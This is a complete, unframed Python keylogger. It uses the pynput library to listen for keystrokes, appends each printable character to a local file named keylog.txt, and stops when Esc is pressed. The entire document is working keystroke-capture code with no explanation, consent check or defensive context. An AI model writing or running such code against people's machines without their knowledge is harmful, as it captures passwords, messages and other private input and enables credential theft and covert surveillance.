import pynput.keyboard

# Function to write key to log file
def write_to_file(key):
    # Open log file in append mode
    with open("keylog.txt", "a") as f:
        # Convert key to string for writing to file
        key_str = str(key)
        # If key is printable character, write to file
        if key_str.find("Key") == -1:
            f.write(key_str)

# Function to handle pressing of key
def on_press(key):
    write_to_file(key)

# Function to handle releasing of key
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Start listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
